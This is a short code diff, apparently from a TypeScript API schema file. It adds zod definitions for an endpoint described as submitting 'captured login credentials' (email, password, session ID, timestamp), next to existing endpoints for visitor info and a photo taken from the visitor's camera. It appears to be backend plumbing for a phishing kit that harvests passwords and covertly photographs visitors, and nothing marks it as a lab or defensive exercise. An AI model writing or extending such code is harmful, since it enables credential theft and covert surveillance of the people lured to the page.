@@ -37,6 +37,21 @@ export const SubmitVisitorInfoResponse = zod.object({
 });
 
 /**
+ * @summary Submit captured login credentials
+ */
+export const SubmitCredentialsBody = zod.object({
+  sessionId: zod.string(),
+  email: zod.string(),
+  password: zod.string(),
+  timestamp: zod.string(),
+});
+
+export const SubmitCredentialsResponse = zod.object({
+  success: zod.boolean(),
+  sessionId: zod.string(),
+});
+
+/**
  * Saves a base64-encoded photo from the visitor's camera
  * @summary Submit a captured photo
  */
